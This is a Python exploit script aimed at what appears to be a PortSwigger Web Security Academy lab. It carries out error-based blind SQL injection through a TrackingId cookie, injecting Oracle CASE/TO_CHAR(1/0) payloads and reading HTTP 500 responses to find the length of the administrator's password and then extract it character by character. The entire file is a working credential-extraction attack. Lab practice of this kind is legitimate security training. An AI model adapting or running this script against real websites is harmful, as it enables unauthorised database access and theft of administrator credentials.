import requests

url = 'https://0a280082042909fa8037e5ea001b0036.web-security-academy.net/filter?category=Lifestyle'
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

def get_length():
    for i in range(1, 101):
        cookie = {
            'TrackingId': 'QnDGxJmhsvkGz4sr',
            'session': 'XQb5h4Uu3xMNQWGCdpS1V3kOvrr975Ig'
        }
        # Correct variable used in the payload
        payload = f"' || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')) = {i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
        cookie['TrackingId'] += payload
        r = requests.get(url, cookies=cookie)
        if r.status_code == 500:
            return i

def get_data(length):
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            cookie = {
                'TrackingId': 'QnDGxJmhsvkGz4sr',
                'session': 'XQb5h4Uu3xMNQWGCdpS1V3kOvrr975Ig'
            }
            # Correct variable used in the payload
            payload = f"' || (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1) = '{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
            cookie['TrackingId'] += payload
            r = requests.get(url, cookies=cookie)
            if r.status_code == 500:
                temp += char
                print(f'\rPassword so far: {temp}', end='')
                break
    return temp

length = get_length()
print(f"Password length: {length}")
print("Dumping the data, please wait...")
data = get_data(length)
print(f"\nExtracted password: {data}")
